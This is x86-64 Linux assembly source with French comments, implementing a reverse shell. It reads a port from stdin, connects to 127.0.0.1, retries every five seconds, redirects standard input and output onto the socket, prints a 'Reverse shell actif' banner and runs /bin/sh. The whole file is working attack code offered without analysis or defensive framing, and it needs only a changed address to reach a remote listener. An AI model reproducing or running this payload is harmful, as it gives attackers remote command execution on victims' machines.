section .bss
port_buf resb 6            ; buffer pour lecture du port

section .data
sockaddr:
    dw 2                ; AF_INET
    dw 0x5c11           ; port 4444 (big endian = 0x115c)
    dd 0x0100007F       ; 127.0.0.1 = 0x7F000001 → 0x0100007F
    dq 0                ; sin_zero

shellpath: db "/bin/sh", 0

banner: db 10, 27, "[32m[*] Reverse shell actif. Bienvenue !", 10, 27, "[0m", 10
banner_len equ $ - banner

timespec_5s:
    dq 5                ; tv_sec = 5 sec
    dq 0                ; tv_nsec = 0

section .text
global _start

_start:
    ; === Lire le port depuis stdin ===
    mov     rax, 0          ; syscall: read
    mov     rdi, 0          ; fd = stdin
    lea     rsi, [rel port_buf]
    mov     rdx, 6
    syscall

    ; === Parser "4444\n" → 4444 ===
    xor     rbx, rbx        ; résultat final dans rbx
    xor     rcx, rcx        ; index
.parse_loop:
    mov     al, [port_buf + rcx]
    cmp     al, 10          ; saut de ligne ?
    je      .parse_done
    sub     al, '0'         ; ASCII → chiffre
    imul    rbx, rbx, 10
    add     rbx, rax
    inc     rcx
    cmp     rcx, 6
    jl      .parse_loop
.parse_done:

    ; === Convertir en big endian et insérer dans sockaddr ===
    mov     ax, bx
    xchg    al, ah
    mov     word [sockaddr + 2], ax

.retry_connection:
    ; === socket(AF_INET, SOCK_STREAM, 0) ===
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    ; === connect(socket_fd, &sockaddr, 16) ===
    mov     rax, 42
    mov     rdi, r12
    lea     rsi, [rel sockaddr]
    mov     rdx, 16
    syscall
    test    rax, rax
    js      .wait_retry

.success_connection:
    ; === dup2 pour stdin, stdout, stderr ===
    mov     rsi, 2
.dup_loop:
    mov     rax, 33
    mov     rdi, r12
    mov     rdx, rsi
    syscall
    dec     rsi
    jns     .dup_loop

    ; === bannière ===
    mov     rax, 1
    mov     rdi, r12
    lea     rsi, [rel banner]
    mov     rdx, banner_len
    syscall

    ; récupérer envp depuis la stack
    mov     rbx, [rsp]               ; argc
    lea     rbx, [rsp + 8 + rbx*8]   ; skip argv + NULL
    add     rbx, 8                   ; pointe sur envp

    ; execve("/bin/sh", NULL, envp)
    mov     rax, 59
    lea     rdi, [rel shellpath]
    xor     rsi, rsi                ; argv = NULL
    mov     rdx, rbx                ; envp depuis la stack
    syscall

    ; exit(0) si execve échoue
    mov     rax, 60
    xor     rdi, rdi
    syscall

.wait_retry:
    ; close(socket_fd)
    mov     rax, 3
    mov     rdi, r12
    syscall

    ; nanosleep(5 sec)
    mov     rax, 35
    lea     rdi, [rel timespec_5s]
    xor     rsi, rsi
    syscall

    jmp .retry_connection
